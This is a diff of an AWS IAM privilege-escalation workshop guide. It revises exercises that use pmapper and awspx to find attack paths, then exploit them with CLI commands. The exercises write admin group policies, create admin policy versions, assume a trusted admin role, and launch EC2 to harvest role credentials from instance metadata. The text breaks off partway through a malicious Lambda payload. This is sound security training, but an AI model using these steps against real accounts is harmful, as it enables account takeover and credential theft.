@@ -45,20 +45,13 @@ Take a moment to explore the different categories in pathfinding.cloud. You can 
 
 ## Exercise 1: Building Your IAM Intelligence
 
-Now that you are familiar with general privilege escalation techniques, it's time to find find out what IAM vulnerabilities exist in your lab AWS account. You will approach this the same way many bad actors do, with open source cloud pentesting tools. You will use the following two tools to do reconnaissance on the lab AWS account and find the juciest IAM vulnerabilities to exploit.
+Now that you are familiar with general privilege escalation techniques, it's time to find find out what IAM vulnerabilities exist in your lab AWS account. You will use two open source pentesting tools to do reconnaissance on the lab AWS account and find the juciest IAM vulnerabilities to exploit.
 
 - **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
-- **awspx**: Visualizes IAM relationships as an interactive graph
+- **awspx**: Visualizes IAM relationships as an interactive graph and is a great tool for high-level review of effective access paths between users, roles, and resources.
 
 > [!NOTE]
 > In addition to the tools you will use in this lab, there are several well known AWS pentesting tools useful for IAM privilege escalation. The **OSS DETECTION** field on pathfinding.cloud shows you which existing open source tools can detect a given attack path.
-
-### Understanding the Tools
-
-| Tool | Purpose | 
-|------|---------|
-| pmapper | Script and library for identifying risks in the configuration of AWS Identity and Access Management (IAM) |
-| awspx | Graph-based tool for visualizing effective access and resource relationships within AWS |
 
 ### Part A: Create the pmapper Graph
 
@@ -66,8 +59,6 @@ pmapper works by first building a "graph" of your AWS account's IAM configuratio
 
 > [!NOTE]
 > **What permissions does pmapper need?** pmapper makes read-only AWS API calls to build its graph — `iam:List*` and `iam:Get*` actions across users, roles, groups, and policies. It also calls `sts:GetCallerIdentity` and checks for Organizations SCPs. The AWS managed policy **ReadOnlyAccess** is sufficient. pmapper never modifies your account — it only reads configuration data to build a local graph model.
->
-> While Pmapper is primarily 
 
 1. **Create the IAM graph:**
    ```bash
@@ -143,7 +134,7 @@ pmapper analysis --output-type text
 
 ### Part C: Load Data into awspx
 
-awspx provides a visual way to explore IAM relationships. Where pmapper gives you text-based output, awspx renders an **interactive graph** so you can visually trace how users, roles, groups, and policies connect—and where attack paths exist. It's already running at [http://localhost](http://localhost).
+awspx also provides a visual way to explore IAM relationships. awspx renders an **interactive graph** so you can visually trace how users, roles, groups, and policies connect—and where attack paths exist. It's already running at [http://localhost](http://localhost).
 
 1. **Ingest AWS IAM data:**
    ```bash
@@ -152,24 +143,19 @@ awspx provides a visual way to explore IAM relationships. Where pmapper gives yo
 
    Similar to pmapper, this command pulls IAM data into awspx's graph database (Neo4j).
 
-2. **Open awspx** in your browser at [http://localhost](http://localhost)
+1. **Open awspx** in your browser at [http://localhost](http://localhost)
 
    You'll see an empty canvas with a **search bar** at the bottom and a **toolbar** on the right side.
 
-3. **Ask the key question:** pmapper already told you that `iamws-group-admin-user` can escalate to admin. Now let's use awspx to **see how**. The question we're asking is: *"Can this user reach full admin access — and if so, through what path?"*
-
-   awspx answers this through **Advanced Search**, which finds paths between any two resources in the graph.
+1. **Visualize the privesc path:** pmapper already told you that `iamws-group-admin-user` can escalate to admin. Now let's use awspx **Advanced Search**, which finds paths between any two resources in the graph.
 
    a. Click the **filter icon** (the sliders icon to the right of the search bar) to open the **Advanced Search** panel. You'll see **From** and **To** fields, a **Mode** section, and a query editor at the bottom.
 
    b. Click into the **From** field and type `iamws-group-admin-user`. A dropdown appears — you'll see several similarly-named resources (`iamws-group-admin-policy`, `iamws-group-admin-role`, `iamws-group-admin-user`). Make sure you select the **user** — the one ending in `-user`.
 
-      > [!TIP]
-      > awspx stores users, roles, groups, and policies as separate resources. Many share a name prefix, so always check the resource type (shown by the icon and the ARN path like `/user/` vs `/role/`).
-
    c. Click into the **To** field and type `Effective Admin`. Select it from the dropdown.
 
-      **What is "Effective Admin"?** This is a pseudo-node that awspx creates automatically during data ingestion. It represents the goal of a privilege escalation attack: full administrative access (`Action: *, Resource: *`). It's not a real IAM entity — it's awspx's way of giving you a target to search toward.
+      **What is "Effective Admin"?** This is a pseudo-node that awspx creates automatically during data ingestion. It represents the goal of a privilege escalation attack: full administrative access (`Action: *, Resource: *`).
 
    d. Look at the query editor at the bottom of the panel. awspx auto-generated a [Cypher](https://neo4j.com/docs/cypher-manual/current/introduction/) query:
       ```
@@ -183,9 +169,9 @@ awspx provides a visual way to explore IAM relationships. Where pmapper gives yo
 
    e. Click the **Run** button (▶) at the bottom-right of the Advanced Search panel.
 
-4. **See the attack path:**
+1. **See the attack path:**
 
-   The result renders behind the Advanced Search panel. Click anywhere on the canvas background to dismiss the panel and reveal the graph.
+   The result renders behind the Advanced Search panel. Click anywhere on the canvas background to dismiss the search panel and reveal the graph.
 
    You should now see two nodes connected by a **maroon dashed edge**:
 
@@ -199,7 +185,7 @@ awspx provides a visual way to explore IAM relationships. Where pmapper gives yo
    - **Action edges** (labeled gradient-colored lines) — Individual resolved IAM permissions, like `s3:GetObject` or `iam:PutGroupPolicy`. These show what a principal is allowed to *do*.
    - **Attack edges** (maroon dashed lines) — Computed privilege escalation paths. awspx analyzes the transitive edges and action edges together and determines that a principal can chain permissions to escalate privileges. The attack edge you see now means awspx has found a viable escalation path from this user to full admin.
 
-5. **Explore the node — click `iamws-group-admin-user`:**
+1. **Explore the node**
 
    Before we look at the attack itself, let's orient ourselves with the tool. Click on the **`iamws-group-admin-user`** node. A properties panel opens at the top of the screen with several tabs. Click through each one:
 
@@ -210,7 +196,7 @@ awspx provides a visual way to explore IAM relationships. Where pmapper gives yo
 
    Now click anywhere on the canvas background to dismiss the panel.
 
-6. **Explore IAM relationships — right-click the node:**
+1. **Explore IAM relationships — right-click the node:**
 
    Right-click on the **`iamws-group-admin-user`** node. A context menu appears with four buttons around the node. Hover over each button to see what it is.
 
@@ -229,7 +215,7 @@ awspx provides a visual way to explore IAM relationships. Where pmapper gives yo
 
    Click anywhere on the canvas to dismiss any open panels before continuing.
 
-7. **Discover the exploit — click the attack edge:**
+1. **Discover the exploit — click the attack edge:**
 
    Click directly on the **maroon dashed line** (the attack edge) between the two nodes. A panel opens at the top-left with two tabs: **Attack Path** and **Notes**.
 
@@ -253,30 +239,130 @@ awspx provides a visual way to explore IAM relationships. Where pmapper gives yo
    )
    ```
 
-   **Read this carefully.** awspx is telling you that `iamws-group-admin-user` can call `iam:PutGroupPolicy` to write an inline admin policy on the group `iamws-dev-team`. Since this user is a *member* of that group, the new policy immediately grants them full admin access.
+   awspx is telling you that `iamws-group-admin-user` can call `iam:PutGroupPolicy` to write an inline admin policy on the group `iamws-dev-team`. Since this user is a *member* of that group, the new policy immediately grants them full admin access.
 
-   This is the entire attack plan — laid out by a tool, from a single graph query. You'll execute this exact attack in Exercise 7.
+   This is the entire attack plan — laid out by a tool, from a single graph query. Now you are ready to escalate privileges.
 
-   > [!NOTE]
-   > awspx doesn't just show you that a path *exists* — it shows you exactly *how to exploit it*. This is what makes graph-based tools so powerful compared to reading JSON policies by hand: the tool connects the dots that a human reviewer would likely miss.
+**The exercise pattern:** For each of the remaining exercises, you'll follow the same workflow: **(1)** visualize the attack path in awspx, **(2)** confirm the vulnerability with pmapper, **(3)** review the attack conceptually on pathfinding.cloud, and **(4)** exploit it. You've already completed the awspx visualization for the next excercise, so the instructions will jump straight to pmapper.
 
-8. **Explore on your own:** Close the Attack Path panel by clicking on the canvas, then click the **Clear the screen** button (monitor icon) in the right toolbar to clear the graph. Open Advanced Search again and try querying other `iamws-` users (like `iamws-ci-runner-user` or `iamws-role-assumer-user`) in the **From** field with `Effective Admin` in the **To** field. Each user reaches admin through a *different* attack edge — click the maroon dashed line on each to see the different exploitation techniques. This is the variety of vulnerabilities you'll exploit in the upcoming exercises.
+> **NOTE:**
+> Each excercise has instructions for both awspx and pmapper, which is in many cases redundant, but will familiarize you with both tools. Feel free to focus on one tool if you prefer.
 
-   > [!TIP]
-   > The main search bar at the bottom also lets you add individual resources to the canvas by name — useful for exploring how a specific user, role, or policy connects to the rest of the graph. Try adding a few `iamws-` resources to see their icons and labels.
+## Exercise 2: PutGroupPolicy - Self-Escalation via Groups
 
-You now have two powerful tools for IAM reconnaissance. pmapper gives you scriptable text output for querying specific permissions. awspx gives you a visual graph that reveals not just *whether* a privilege escalation exists, but the *exact exploit path* to carry it out.
+**Category:** Self-Escalation
+**Starting point identity:** `iamws-group-admin-user`
+
+**The Vulnerability:** The `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, they can write an admin policy on that group—immediately granting themselves full access.
+
+### Part A: Query permissions with pmapper
+
+pmapper can answer specific questions about what principals can and can't do. In your terminal, try the following query.
+
+```bash
+pmapper query "can user/iamws-group-admin-user do iam:PutGroupPolicy with *"
+```
+
+Expected output:
+```
+user/iamws-group-admin-user IS authorized to call action
+iam:PutGroupPolicy for resource *
+```
+
+**What this means:** The user can write inline policies on ANY group—including groups they belong to. 
+
+### Part B: Understand the Attack Conceptually 
+
+Visit [pathfinding.cloud IAM-011](https://pathfinding.cloud/paths/iam-011) to explore and learn more about this type of path.
+
+### Part C: Exploit the Vulnerability
+
+> [!TIP]
+> The `--profile` flag tells the AWS CLI to use a specific named profile's credentials for that single command, without affecting your shell environment. Each exercise uses a different profile to act as the attacker.
+
+**Step 1: Verify your attacker identity**
+```bash
+aws sts get-caller-identity --profile iamws-group-admin-user
+```
+
+You should see you're now operating as `iamws-group-admin-user`.
+
+**Step 2: Check with groups your user is part of**
+
+### Check which groups the attacker belongs to
+```
+aws iam list-groups-for-user --user-name iamws-group-admin-user \
+  --query 'Groups[].GroupName' --output table \
+  --profile iamws-group-admin-user
+```
+
+You'll see the user is a member of `iamws-dev-team`.
+
+**Step 3: View the current benign inline policy**
+```bash
+# List inline policies on the group
+aws iam list-group-policies --group-name iamws-dev-team \
+  --profile iamws-group-admin-user
+
+# Read the current policy (read-only permissions)
+aws iam get-group-policy \
+  --group-name iamws-dev-team \
+  --policy-name iamws-dev-team-readonly \
+  --query 'PolicyDocument' --output json \
+  --profile iamws-group-admin-user
+```
+
+Note the limited permissions (S3/EC2 read-only).
+
+**Step 4: Write an admin inline policy on the group**
+```bash
+aws iam put-group-policy \
+  --group-name iamws-dev-team \
+  --policy-name iamws-dev-team-escalated \
+  --policy-document '{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Action": "*",
+      "Resource": "*"
+    }]
+  }' \
+  --profile iamws-group-admin-user
+```
+
+**Step 5: Verify the escalation**
+```bash
+# Now test an admin action - list all IAM users
+aws iam list-users --query 'Users[].UserName' --output table \
+  --profile iamws-group-admin-user
+```
+
+**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. Every member of `iamws-dev-team` is now also an admin.
+
+### Explore on Your Own
+
+Before continuing, take a moment to explore other attack paths in awspx. Close any open panels by clicking on the canvas, then click the **Clear the screen** button (monitor icon) in the right toolbar to clear the graph. Open Advanced Search again and try querying other `iamws-` users (like `iamws-ci-runner-user` or `iamws-role-assumer-user`) in the **From** field with `Effective Admin` in the **To** field. Each user reaches admin through a *different* attack edge — click the maroon dashed line on each to see the different exploitation techniques. This is the variety of vulnerabilities you'll exploit in the upcoming exercises.
+
+> [!TIP]
+> The main search bar at the bottom also lets you add individual resources to the canvas by name — useful for exploring how a specific user, role, or policy connects to the rest of the graph. Try adding a few `iamws-` resources to see their icons and labels.
 
 ---
 
-## Exercise 2: CreatePolicyVersion - Self-Escalation
+## Exercise 3: CreatePolicyVersion - Self-Escalation
 
 **Category:** Self-Escalation
-**Attacker:** `iamws-policy-developer-user`
+**Starting Identity:** `iamws-policy-developer-user`
 
 **The Vulnerability:** The `iamws-policy-developer-user` can create new versions of IAM policies—including a policy that's attached to themselves. By creating a new version with administrator permissions and setting it as default, they escalate their own privileges.
 
 **Real-world scenario:** A developer is given permission to manage "development" policies for their team. Without proper constraints, they can modify ANY policy—including ones attached to their own user, effectively granting themselves any permission they want.
+
+### Visualize in awspx
+
+Open **Advanced Search** in awspx. Set **From** to `iamws-policy-developer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge labeled **`CreatePolicyVersion`** — awspx has identified that this user can modify a policy attached to themselves to reach admin.
+
+> **NOTE**
+> Make sure to click **Run** (▶) to run your new query, or you will still see the graph from the previous excercise.
 
 ### Part A: Identify with pmapper
 
@@ -303,39 +389,23 @@ Visit [pathfinding.cloud IAM-001](https://pathfinding.cloud/paths/iam-001) to un
 - **Attack:** Create a new policy version with admin permissions, set as default
 - **Impact:** Immediate full account access
 
-Self-escalation attacks are the simplest privilege escalation—the attacker doesn't need to compromise another principal, they just modify their own permissions.
-
 ### Part C: Exploit the Vulnerability
 
 Now let's prove this vulnerability is exploitable.
 
-**Step 1: Get credentials for the vulnerable principal**
+**Step 1: Verify your attacker identity**
+```bash
+aws sts get-caller-identity --profile iamws-policy-developer-user
+```
+
+You should see you're now operating as `iamws-policy-developer-user`.
+
+**Step 2: Identify the policy attached to this user**
 ```bash
 # Store the account ID
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
+  --profile iamws-policy-developer-user)
 
-# Assume the vulnerable role
-CREDS=$(aws sts assume-role \
-  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-policy-developer-role \
-  --role-session-name attacker \
-  --query "Credentials" \
-  --output json)
-
-# Set the credentials
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
-```
-
-**Step 2: Verify your attacker identity**
-```bash
-aws sts get-caller-identity
-```
-
-You should see you're now operating as the `iamws-policy-developer-role`.
-
-**Step 3: Identify the policy attached to this user**
-```bash
 # The developer-tools-policy is attached to this user
 POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"
 
@@ -344,12 +414,13 @@ aws iam get-policy-version \
   --policy-arn $POLICY_ARN \
   --version-id v1 \
   --query 'PolicyVersion.Document' \
-  --output json
+  --output json \
+  --profile iamws-policy-developer-user
 ```
 
 Note the limited permissions (S3, EC2 read-only).
 
-**Step 4: Create a new policy version with admin permissions**
+**Step 3: Create a new version of the policy with admin permissions**
 ```bash
 aws iam create-policy-version \
   --policy-arn $POLICY_ARN \
@@ -361,47 +432,39 @@ aws iam create-policy-version \
       "Resource": "*"
     }]
   }' \
-  --set-as-default
+  --set-as-default \
+  --profile iamws-policy-developer-user
 ```
 
-**Step 5: Verify the escalation**
+**Step 4: Verify the escalation**
 ```bash
 # Now test an admin action - list all IAM users
-aws iam list-users --query 'Users[].UserName' --output table
+aws iam list-users --query 'Users[].UserName' --output table \
+  --profile iamws-policy-developer-user
 ```
 
 **You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself.
-
-### Cleanup
-
-Reset your credentials before continuing:
-```bash
-unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
-
-# Verify you're back to your original identity
-aws sts get-caller-identity
-```
-
-**Instructor will reset the policy version.**
 
 ### What You Learned
 
 - **iam:CreatePolicyVersion** allows modifying any policy, including ones attached to self
 - The root cause is the ability to modify a policy that grants YOUR OWN permissions
-- Even with resource constraints, if you can modify your own attached policy, you can escalate
-- **Remediation preview:** In Lab 2, you'll apply a **Permissions Boundary** to cap maximum permissions
 
 ---
 
-## Exercise 3: AssumeRole - Principal Access via Permissive Trust
+## Exercise 4: AssumeRole - Principal Access via Permissive Trust
 
 **Category:** Principal Access
-**Attacker:** `iamws-role-assumer-user`
+**Starting AWS Identity:** `iamws-role-assumer-user`
 **Target:** `iamws-privileged-admin-role`
 
 **The Vulnerability:** The `iamws-privileged-admin-role` has an overly permissive trust policy—it trusts the entire AWS account (`:root`). Any principal in the account with `sts:AssumeRole` permission can assume this admin role.
 
-**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking "this restricts it to our account." But account root trust means ANY principal in the account with AssumeRole permission can become this role.
+**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking "this restricts it to one root user." But account root trust means ANY principal in the account with AssumeRole permission can become this role.
+
+### Visualize in awspx
+
+Open **Advanced Search** in awspx. Set **From** to `iamws-role-assumer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge labeled **`AssumeRole`** — awspx has identified that this user can assume a privileged role to reach admin.
 
 ### Part A: Identify with pmapper
 
@@ -453,40 +516,33 @@ You'll see:
 
 ### Part D: Exploit the Vulnerability
 
-**Step 1: Assume the low-privilege role**
+**Step 1: Verify your low-privilege identity**
 ```bash
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
-
-CREDS=$(aws sts assume-role \
-  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-role-assumer-role \
-  --role-session-name attacker \
-  --query "Credentials" \
-  --output json)
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
+ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
+  --profile iamws-role-assumer-user)
+aws sts get-caller-identity --profile iamws-role-assumer-user
 ```
 
-**Step 2: Verify your low-privilege identity**
-```bash
-aws sts get-caller-identity
-```
+You should see you're now operating as `iamws-role-assumer-user`.
 
-**Step 3: Assume the privileged admin role**
+**Step 2: Assume the privileged admin role**
+
+This is the exploit — the user's `sts:AssumeRole` permission combined with the permissive trust policy allows assuming the admin role:
+
 ```bash
 ADMIN_CREDS=$(aws sts assume-role \
   --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
   --role-session-name escalated \
   --query "Credentials" \
-  --output json)
+  --output json \
+  --profile iamws-role-assumer-user)
 
 export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
 ```
 
-**Step 4: Verify escalation**
+**Step 3: Verify escalation**
 ```bash
 aws sts get-caller-identity
 ```
@@ -496,26 +552,39 @@ You should see `iamws-privileged-admin-role` in the ARN. You now have `Administr
 ### Cleanup
 
 ```bash
+# Unset the escalated role credentials
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+
+# Verify you're back to your original identity
+aws sts get-caller-identity
 ```
 
 ### What You Learned
 
 - Trust policies using `:root` trust the entire account, not just the root user
-- The vulnerability is in the **resource policy** (trust policy), not the identity policy
-- **Remediation preview:** In Lab 2, you'll **harden the trust policy** to trust only specific principals
+- The vulnerability is in the **resource policy** (trust policy), attached to the IAM role
 
 ---
 
-## Exercise 4: PassRole + EC2 - New PassRole
+## Exercise 5: PassRole + EC2 - New PassRole
 
 **Category:** New PassRole
-**Attacker:** `iamws-ci-runner-user`
+**Starting AWS identity:** `iamws-ci-runner-user`
 **Target:** `iamws-prod-deploy-role` (via EC2 instance)
 
-**The Vulnerability:** The `iamws-ci-runner-user` can pass any role to an EC2 instance because the PassRole permission is missing the `iam:PassedToService` condition key. By launching an instance with a privileged instance profile, they can harvest the role's credentials from the instance metadata service.
+> [!NOTE]
+> **New to EC2 and PassRole?** Here's a quick primer:
+> - **EC2 instance** = a virtual machine running in the cloud. 
+> - **Instance profile** = the mechanism for attaching an IAM role to an EC2 instance. The instance can then retrieve temporary credentials for that role from the [instance metadata service](http://169.254.169.254). This exists so workloads running on your EC2 instances (and other compute in AWS) can use these credentials to access other cloud services like your storage or databases
+> - **`iam:PassRole`** = the permission that controls which IAM roles a user can hand off ("pass") to an AWS service. You don't *become* the role — you tell a service like EC2 or Lambda to *use* it. PassRole is the gatekeeper for that handoff.
 
-**Real-world scenario:** A CI/CD pipeline user needs to launch EC2 instances for build jobs. Without the `iam:PassedToService` condition, they can pass ANY role to EC2—including production admin roles.
+**The Vulnerability:** The `iamws-ci-runner-user` has `iam:PassRole` intended for Lambda deployments, but the permission is missing the `iam:PassedToService` condition key. Without this condition, PassRole works for *any* AWS service — including EC2. 
+
+**Real-world scenario:** A CI/CD pipeline user needs `iam:PassRole` to deploy Lambda functions and has separate EC2 permissions for build infrastructure. Without the `iam:PassedToService` condition, PassRole isn't scoped to Lambda — it works for all services. The attacker exploits this gap by passing a privileged role to EC2 instead.
+
+### Visualize in awspx
+
+Open **Advanced Search** in awspx. Set **From** to `iamws-ci-runner-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge showing the EC2-related escalation path — awspx has identified that this user can pass a privileged role to an EC2 instance to reach admin.
 
 ### Part A: Identify with pmapper
 
@@ -556,77 +625,138 @@ aws iam get-policy-version \
   --output json
 ```
 
-Notice the PassRole statement has `Resource: "*"` but **no Condition block**. The missing condition is:
+Notice the PassRole statement has `Resource: "*"` but **no Condition block**. Since this user's PassRole is intended for Lambda deployments, the missing condition is:
 ```json
 "Condition": {
   "StringEquals": {
-    "iam:PassedToService": "ec2.amazonaws.com"
+    "iam:PassedToService": "lambda.amazonaws.com"
   }
 }
 ```
 
-### Part D: Understand the Attack Flow
+With this condition, PassRole would only work when handing a role to Lambda — the EC2 attack path would be completely blocked.
 
-We won't actually launch an EC2 instance (to avoid costs), but here's how the attack works:
+### Part D: Exploit the Vulnerability
 
-**Step 1: Assume the CI runner role**
-```bash
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
-
-CREDS=$(aws sts assume-role \
-  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
-  --role-session-name attacker \
-  --query "Credentials" \
-  --output json)
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
-```
-
-**Step 2: Find privileged instance profiles**
+**Step 1: Find privileged instance profiles**
 ```bash
 aws iam list-instance-profiles \
   --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' \
-  --output table
+  --output table \
+  --profile iamws-ci-runner-user
 ```
 
-You'll see `iamws-prod-deploy-profile` with role `iamws-prod-deploy-role` (which has `*:*` permissions).
+You'll see `iamws-prod-deploy-profile` with role `iamws-prod-deploy-role` (which has `*:*` permissions). This is our target.
 
-**Step 3 (Conceptual): Launch EC2 with privileged profile**
+**Step 2: Find a suitable AMI and subnet**
+
+We need an Amazon Linux 2 AMI (which has the SSM agent pre-installed) and a subnet to launch into:
+
 ```bash
-# DO NOT RUN - for illustration only
-aws ec2 run-instances \
-  --image-id ami-xxxxx \
+# Get the latest Amazon Linux 2 AMI
+AMI_ID=$(aws ec2 describe-images \
+  --owners amazon \
+  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
+            "Name=state,Values=available" \
+  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
+  --output text \
+  --profile iamws-ci-runner-user)
+
+echo "AMI: $AMI_ID"
+
+# Get the default VPC's first subnet
+SUBNET_ID=$(aws ec2 describe-subnets \
+  --filters "Name=default-for-az,Values=true" \
+  --query 'Subnets[0].SubnetId' \
+  --output text \
+  --profile iamws-ci-runner-user)
+
+echo "Subnet: $SUBNET_ID"
+```
+
+**Step 3: Launch EC2 with the privileged instance profile**
+
+This is the vulnerability proven — unrestricted `iam:PassRole` allows attaching an admin role to EC2:
+
+```bash
+INSTANCE_ID=$(aws ec2 run-instances \
+  --image-id $AMI_ID \
   --instance-type t2.micro \
   --iam-instance-profile Name=iamws-prod-deploy-profile \
-  --key-name my-key
+  --subnet-id $SUBNET_ID \
+  --query 'Instances[0].InstanceId' \
+  --output text \
+  --profile iamws-ci-runner-user)
+
+echo "Launched instance: $INSTANCE_ID"
 ```
 
-**Step 4 (Conceptual): Harvest credentials from instance**
+**Step 4: Wait for the instance and SSM agent to come online**
+
+The instance needs ~60-90 seconds to boot and register with SSM:
+
 ```bash
-# From inside the EC2 instance:
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/iamws-prod-deploy-role
+echo "Waiting for instance to reach running state..."
+aws ec2 wait instance-running --instance-ids $INSTANCE_ID \
+  --profile iamws-ci-runner-user
+
+echo "Waiting for SSM agent to register (this may take up to 90 seconds)..."
+for i in $(seq 1 30); do
+  SSM_STATUS=$(aws ssm describe-instance-information \
+    --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
+    --query 'InstanceInformationList[0].PingStatus' \
+    --output text \
+    --profile iamws-ci-runner-user 2>/dev/null)
+  if [ "$SSM_STATUS" = "Online" ]; then
+    echo "SSM agent is online!"
+    break
+  fi
+  echo "  Attempt $i/30 - SSM status: ${SSM_STATUS:-not yet registered}"
+  sleep 5
+done
 ```
 
-The metadata service returns temporary credentials for the attached role.
-
-### Cleanup
+**Step 5: Start an interactive SSM session and harvest credentials**
 
 ```bash
-unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+aws ssm start-session --target $INSTANCE_ID \
+  --profile iamws-ci-runner-user
+```
+
+Once inside the session, run the following commands to prove you have admin access via the instance's role:
+
+```bash
+# Inside the SSM session:
+# Get a token for IMDSv2
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Retrieve the role credentials from the instance metadata service
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/iamws-prod-deploy-role
+
+# Prove admin access
+aws sts get-caller-identity
+aws iam list-users --query 'Users[].UserName' --output table
+```
+
+You should see the caller identity shows `iamws-prod-deploy-role` — you now have full admin access from inside the EC2 instance.
+
+**Step 6: Exit the session**
+```bash
+exit
 ```
 
 ### What You Learned
 
-- **iam:PassRole** controls which roles can be attached to compute services
-- The missing `iam:PassedToService` condition is the root cause (not just `Resource: "*"`)
+- **iam:PassRole** controls which roles can be handed off to AWS services like EC2 and Lambda
+- The missing `iam:PassedToService` condition is the root cause — PassRole was intended for Lambda, but without the condition it worked for EC2 too
 - Unrestricted PassRole + compute permissions = credential access to any role with an instance profile
-- **Remediation preview:** In Lab 2, you'll add the **iam:PassedToService condition key**
+- **Remediation preview:** In Lab 2, you'll add `iam:PassedToService: lambda.amazonaws.com` to scope PassRole to its intended service, completely blocking the EC2 attack path
 
 ---
 
-## Exercise 5: UpdateFunctionCode - Existing PassRole
+## Exercise 6: UpdateFunctionCode - Existing PassRole
 
 **Category:** Existing PassRole
 **Attacker:** `iamws-lambda-developer-user`
@@ -635,6 +765,10 @@ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 **The Vulnerability:** The `iamws-lambda-developer-user` can update the code of ANY Lambda function—including functions that have privileged execution roles. By replacing the code with a malicious payload, they can exfiltrate the Lambda's credentials.
 
 **Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own), they can target Lambdas with privileged roles.
+
+### Visualize in awspx
+
+Open **Advanced Search** in awspx. Set **From** to `iamws-lambda-developer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge showing the Lambda-related escalation path — awspx has identified that this user can modify a privileged Lambda function to reach admin.
 
 ### Part A: Identify with pmapper
 
@@ -672,59 +806,134 @@ Unlike "New PassRole" where you CREATE new compute, "Existing PassRole" exploits
 
 ### Part C: Exploit the Vulnerability
 
-**Step 1: Assume the Lambda developer role**
-```bash
-ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
-
-CREDS=$(aws sts assume-role \
-  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-lambda-developer-role \
-  --role-session-name attacker \
-  --query "Credentials" \
-  --output json)
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
-```
-
-**Step 2: Find the privileged Lambda**
+**Step 1: Find the privileged Lambda**
 ```bash
 aws lambda list-functions \
   --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
-  --output table
+  --output table \
+  --profile iamws-lambda-developer-user
 ```
 
 You'll see `iamws-privileged-lambda` with role `iamws-privileged-lambda-role` (which has `AdministratorAccess`).
 
-**Step 3: View the target function's role**
+**Step 2: View the target function's role**
 ```bash
 aws lambda get-function --function-name iamws-privileged-lambda \
-  --query 'Configuration.Role' --output text
+  --query 'Configuration.Role' --output text \
+  --profile iamws-lambda-developer-user
 ```
 
-**Step 4 (Conceptual): Update with malicious code**
+**Step 3: Save the original code hash for reference**
+```bash
+ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
+  --query 'Configuration.CodeSha256' --output text \
+  --profile iamws-lambda-developer-user)
+echo "Original code hash: $ORIGINAL_HASH"
+```
 
-The attack would replace the Lambda code with:
-```python
+**Step 4: Create a malicious Lambda payload**
+
+Create a Python handler that proves admin access by calling `sts:GetCallerIdentity` and `iam:ListUsers`:
+
+```bash
+mkdir -p /tmp/iamws-exploit
+
+cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
 import boto3
-import os
+import json
 
 def handler(event, context):
-    # Exfiltrate the credentials
     sts = boto3.client('sts')
+    iam = boto3.client('iam')
+
